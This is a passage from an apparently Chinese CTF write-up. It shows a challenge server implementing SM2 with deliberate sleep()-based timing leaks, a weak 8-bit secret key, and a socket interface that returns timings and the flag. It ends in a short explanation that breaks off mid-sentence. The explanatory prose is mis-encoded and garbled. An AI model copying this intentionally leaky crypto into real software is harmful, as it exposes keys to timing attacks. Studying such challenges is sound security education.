class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> perf_counter_ns <span class="keyword">as</span> clock1</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ecc_table = &#123;</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;p&#x27;</span>: <span class="string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;g&#x27;</span>: <span class="string">&#x27;32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7&#x27;</span></span><br><span class="line">         <span class="string">&#x27;bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFC&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;28E9FA9E9D9F5E344D5A9E4BCF6509A7F39789F515AB8F92DDBCBD414D940E93&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;O&#x27;</span>: <span class="string">&#x27;0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">         <span class="string">&#x27;0000000000000000000000000000000000000000000000000000000000000000&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TSM2</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, sk</span>):</span><br><span class="line">        self.ecc_table = ecc_table</span><br><span class="line">        self.n = <span class="built_in">int</span>(ecc_table[<span class="string">&#x27;n&#x27;</span>], <span class="number">16</span>)</span><br><span class="line">        self.para_len = <span class="built_in">len</span>(ecc_table[<span class="string">&#x27;n&#x27;</span>])</span><br><span class="line">        self.ecc_a3 = (<span class="built_in">int</span>(ecc_table[<span class="string">&#x27;a&#x27;</span>], base=<span class="number">16</span>) +</span><br><span class="line">                       <span class="number">3</span>) % <span class="built_in">int</span>(ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        self.sk = sk</span><br><span class="line">        self.pk = self.kg(self.sk, ecc_table[<span class="string">&#x27;g&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">self, data, K</span>):</span><br><span class="line">        e = data</span><br><span class="line">        d = self.sk</span><br><span class="line">        k = K</span><br><span class="line"></span><br><span class="line">        P1 = self.kg(k, self.ecc_table[<span class="string">&#x27;g&#x27;</span>])</span><br><span class="line">        x = <span class="built_in">int</span>(P1[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">        R = ((e + x) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;n&#x27;</span>], base=<span class="number">16</span>))</span><br><span class="line">        <span class="keyword">if</span> R == <span class="number">0</span> <span class="keyword">or</span> R + k == <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;n&#x27;</span>], base=<span class="number">16</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        d_1 = <span class="built_in">pow</span>(</span><br><span class="line">            d+<span class="number">1</span>, <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;n&#x27;</span>], base=<span class="number">16</span>) - <span class="number">2</span>, <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;n&#x27;</span>], base=<span class="number">16</span>))</span><br><span class="line">        S = (d_1*(k + R) - R) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;n&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> S == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;%064x%064x&#x27;</span> % (R, S)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, Sign, data</span>):</span><br><span class="line">        r = <span class="built_in">int</span>(Sign[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">        s = <span class="built_in">int</span>(Sign[self.para_len:<span class="number">2</span> * self.para_len], <span class="number">16</span>)</span><br><span class="line">        e = <span class="built_in">int</span>(data.<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">        t = (r + s) % self.n</span><br><span class="line">        <span class="keyword">if</span> t == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        P1 = self.kg(s, self.ecc_table[<span class="string">&#x27;g&#x27;</span>])</span><br><span class="line">        P2 = self.kg(t, self.pk)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> P1 == P2:</span><br><span class="line">            P1 = <span class="string">&#x27;%s%s&#x27;</span> % (P1, <span class="number">1</span>)</span><br><span class="line">            P1 = self._double_point(P1)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            P1 = <span class="string">&#x27;%s%s&#x27;</span> % (P1, <span class="number">1</span>)</span><br><span class="line">            P1 = self._add_point(P1, P2)</span><br><span class="line">            P1 = self._convert_jacb_to_nor(P1)</span><br><span class="line"></span><br><span class="line">        x = <span class="built_in">int</span>(P1[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">return</span> r == ((e + x) % self.n)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">kg</span>(<span class="params">self, k, Point</span>):</span><br><span class="line">        k=k%self.n</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span> * <span class="number">128</span></span><br><span class="line">        Point = <span class="string">&#x27;%s%s&#x27;</span> % (Point, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        mask_str = <span class="string">&#x27;8&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.para_len - <span class="number">1</span>):</span><br><span class="line">            mask_str += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        mask = <span class="built_in">int</span>(mask_str, <span class="number">16</span>)</span><br><span class="line">        Temp = Point</span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(self.para_len * <span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> flag:</span><br><span class="line">                Temp = self._double_point(Temp)</span><br><span class="line">            <span class="keyword">if</span> (k &amp; mask) != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> flag:</span><br><span class="line">                    Temp = self._add_point(Temp, Point)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    flag = <span class="literal">True</span></span><br><span class="line">                    Temp = Point</span><br><span class="line">            k = k &lt;&lt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> self._convert_jacb_to_nor(Temp)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_double_point</span>(<span class="params">self, Point</span>):</span><br><span class="line">        t1=clock1()</span><br><span class="line">        l = <span class="built_in">len</span>(Point)</span><br><span class="line">        len_2 = <span class="number">2</span> * self.para_len</span><br><span class="line">        <span class="keyword">if</span> l &lt; self.para_len * <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x1 = <span class="built_in">int</span>(Point[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">            y1 = <span class="built_in">int</span>(Point[self.para_len:len_2], <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">if</span> l == len_2:</span><br><span class="line">                z1 = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                z1 = <span class="built_in">int</span>(Point[len_2:], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            T6 = (z1 * z1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (y1 * y1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (x1 + T6) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (x1 - T6) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T3 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (y1 * z1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (T2 * <span class="number">8</span>) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T5 = (x1 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 * <span class="number">3</span>) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T6 = (T6 * T6) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T6 = (self.ecc_a3 * T6) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 + T6) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            z3 = (T3 + T3) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T1 * T1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (T2 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            x3 = (T3 - T5) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (T5 % <span class="number">2</span>) == <span class="number">1</span>:</span><br><span class="line">                T4 = (T5 + ((T5 + <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)) &gt;&gt; <span class="number">1</span>) - T3) % <span class="built_in">int</span>(</span><br><span class="line">                    self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                T4 = (T5 + (T5 &gt;&gt; <span class="number">1</span>) - T3) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            T1 = (T1 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            y3 = (T1 - T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            form = <span class="string">&#x27;%%0%dx&#x27;</span> % self.para_len</span><br><span class="line">            form = form * <span class="number">3</span></span><br><span class="line">            t2=clock1()</span><br><span class="line">            <span class="keyword">if</span>(t2-t1&lt;<span class="number">1e7</span>):</span><br><span class="line">                sleep(<span class="number">0.01</span>-(((t2-t1))/<span class="number">1000000000.0</span>))</span><br><span class="line">            <span class="keyword">return</span> form % (x3, y3, z3)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_add_point</span>(<span class="params">self, P1, P2</span>):</span><br><span class="line">        t1=clock1()</span><br><span class="line">        <span class="keyword">if</span> P1 == <span class="string">&#x27;0&#x27;</span> * <span class="number">128</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;%s%s&#x27;</span> % (P2, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> P2 == <span class="string">&#x27;0&#x27;</span> * <span class="number">128</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;%s%s&#x27;</span> % (P1, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        len_2 = <span class="number">2</span> * self.para_len</span><br><span class="line">        l1 = <span class="built_in">len</span>(P1)</span><br><span class="line">        l2 = <span class="built_in">len</span>(P2)</span><br><span class="line">        <span class="keyword">if</span> (l1 &lt; len_2) <span class="keyword">or</span> (l2 &lt; len_2):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            X1 = <span class="built_in">int</span>(P1[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">            Y1 = <span class="built_in">int</span>(P1[self.para_len:len_2], <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">if</span> l1 == len_2:</span><br><span class="line">                Z1 = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                Z1 = <span class="built_in">int</span>(P1[len_2:], <span class="number">16</span>)</span><br><span class="line">            x2 = <span class="built_in">int</span>(P2[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">            y2 = <span class="built_in">int</span>(P2[self.para_len:len_2], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            T1 = (Z1 * Z1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (y2 * Z1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (x2 * T1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 * T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (T3 - X1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T3 + X1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (T2 * T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 - Y1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            Z3 = (Z1 * T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (T2 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T3 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T5 = (T1 * T1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (X1 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            X3 = (T5 - T3) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (Y1 * T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T4 - X3) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 * T3) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            Y3 = (T1 - T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            form = <span class="string">&#x27;%%0%dx&#x27;</span> % self.para_len</span><br><span class="line">            form = form * <span class="number">3</span></span><br><span class="line">            t2=clock1()</span><br><span class="line">            <span class="keyword">if</span>(t2-t1&lt;<span class="number">1e8</span>):</span><br><span class="line">                sleep(<span class="number">0.1</span>-(((t2-t1))/<span class="number">1000000000.0</span>))</span><br><span class="line">            <span class="keyword">return</span> form % (X3, Y3, Z3)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_convert_jacb_to_nor</span>(<span class="params">self, Point</span>):</span><br><span class="line">        len_2 = <span class="number">2</span> * self.para_len</span><br><span class="line">        x = <span class="built_in">int</span>(Point[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">        y = <span class="built_in">int</span>(Point[self.para_len:len_2], <span class="number">16</span>)</span><br><span class="line">        z = <span class="built_in">int</span>(Point[len_2:], <span class="number">16</span>)</span><br><span class="line">        z_inv = <span class="built_in">pow</span>(</span><br><span class="line">            z, <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>) - <span class="number">2</span>, <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>))</span><br><span class="line">        z_invSquar = (z_inv * z_inv) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        z_invQube = (z_invSquar * z_inv) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        x_new = (x * z_invSquar) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        y_new = (y * z_invQube) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        z_new = (z * z_inv) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> z_new == <span class="number">1</span>:</span><br><span class="line">            form = <span class="string">&#x27;%%0%dx&#x27;</span> % self.para_len</span><br><span class="line">            form = form * <span class="number">2</span></span><br><span class="line">            <span class="keyword">return</span> form % (x_new, y_new)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_point</span>(<span class="params">self,P1,P2</span>):</span><br><span class="line">        <span class="keyword">if</span> P1==P2:</span><br><span class="line">            <span class="keyword">return</span> self._double_point(P1)</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            <span class="keyword">return</span> self._convert_jacb_to_nor(self._add_point(P1,P2))</span><br><span class="line"><span class="keyword">import</span> sys,os</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_recvall</span>(<span class="params">self</span>):</span><br><span class="line">        BUFF_SIZE = <span class="number">2048</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            part = self.request.recv(BUFF_SIZE)</span><br><span class="line">            data += part</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(part) &lt; BUFF_SIZE:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span><br><span class="line">        msg=msg.encode()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> newline:</span><br><span class="line">                msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recv</span>(<span class="params">self, prompt=<span class="string">b&#x27;[-] &#x27;</span></span>):</span><br><span class="line">        self.send(prompt, newline=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> self._recvall()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        signal.alarm(<span class="number">3600</span>)</span><br><span class="line">        g=ecc_table[<span class="string">&quot;g&quot;</span>]</span><br><span class="line">        O=ecc_table[<span class="string">&quot;O&quot;</span>]</span><br><span class="line">        t=[randint(<span class="number">1</span>,<span class="number">254</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">        sk=<span class="built_in">sum</span>([<span class="number">1</span>&lt;&lt;i <span class="keyword">for</span> i <span class="keyword">in</span> t])</span><br><span class="line">        </span><br><span class="line">        self.send(<span class="string">&quot;system reseting...&quot;</span>)</span><br><span class="line">        sm2 = TSM2(sk)</span><br><span class="line">        self.send(<span class="string">&quot;done&quot;</span>)</span><br><span class="line">        self.send(<span class="string">&quot;the system is &quot;</span>+<span class="built_in">str</span>(sm2.pk))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                user=<span class="built_in">int</span>(self.recv(<span class="string">&quot;plz give me your number:&quot;</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                self.send(<span class="string">&quot;wrong, plz try again&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            t1=clock1()</span><br><span class="line">            kG=sm2.kg(sk-user,g)</span><br><span class="line">            t2=clock1()</span><br><span class="line">            self.send(<span class="string">&quot;used &quot;</span>+<span class="built_in">str</span>((t2-t1)/<span class="number">1e9</span>)+<span class="string">&quot; s&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> kG==O:</span><br><span class="line">                f=<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">                flag=f.read()</span><br><span class="line">                self.send(flag)</span><br><span class="line">                exit()</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ForkedServer</span>(socketserver.ForkingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">8000</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    <span class="built_in">print</span>(HOST, PORT)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure></blockquote><p><code>TSM2</code> ç±»ä¸ºæ­£å¸¸SM2ç®—æ³•å®ç°ï¼Œåªä¸è¿‡åœ¨åŠ æ³•è¿ç®— <code>_add_point()</code> å’Œå€ä¹˜è¿ç®— <code>_double_point()</code> åˆ†åˆ«åŠ äº† <code>sleep()</code> æ§åˆ¶è¿ç®—æ—¶é—´ã€‚</p><p><code>handle()</code> å¤„ç†å‡½æ•°é‡Œï¼Œç»™å‡ºå…¬é’¥ $pk$ï¼Œç»™100æ¬¡è¦æ±‚è¾“å…¥ $u$ï¼Œå½“æ»¡è¶³ $(sk-u)G=O$ æ—¶å¯æ‹¿flagã€‚</p><p>è¦æ»¡è¶³ $(sk-u)G=O$ï¼Œåªæœ‰ $sk-u=0$ æˆ– 